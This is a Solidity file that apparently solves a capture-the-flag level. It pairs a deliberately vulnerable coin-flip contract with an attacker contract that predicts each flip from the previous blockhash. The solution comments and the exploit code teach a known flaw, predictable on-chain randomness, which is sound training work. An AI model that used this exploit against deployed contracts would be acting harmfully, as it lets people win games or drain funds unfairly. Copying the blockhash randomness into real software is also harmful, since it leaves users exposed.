// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: This is a coin flipping game where you need to build up your winning streak by guessing the outcome 
//		 of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;                                 // adjusted to prevent ompiler version crash

//import '@openzeppelin/contracts/math/SafeMath.sol';   //deactivated to prevent compiler version clash

contract CoinFlip {

  //using SafeMath for uint256;                         //deactivated to prevent compiler version clash
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number -1));   // adjusted to prevent compiler version clash

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;          // adjusted to prevent compiler version clash
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}



//SOLUTION
//- it is not possible to simply put 10 transactions in block since the lastHash==blockValue is preventing this
//- it is however possible to write a smart contract that calculates the blockhash of the last block and divide it by the given FACTOR
//- this way the contract can determine the outcome and submit it to the victim contract
//- run this function 10 times to win this level


contract Attacker {

	CoinFlip victim = CoinFlip(address(0xAb06C68faa9e4aFD8abC20a8Bf51be6Ef6560d42));
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;



  function attack() public returns (bool){
      
     // get blockvalue like in victim function
    uint256 blockValue = uint256(blockhash(block.number -1));   // adjusted to prevent compiler version clash


    // divide blockvalue by factor
    uint256 coinFlip = blockValue / FACTOR;         // adjusted to prevent compiler version clash
    
    // assign true/false depending on division outcome
    bool side = coinFlip == 1 ? true : false;
	
	// call victim contract with educated guess :)
	return victim.flip(side);


  }
}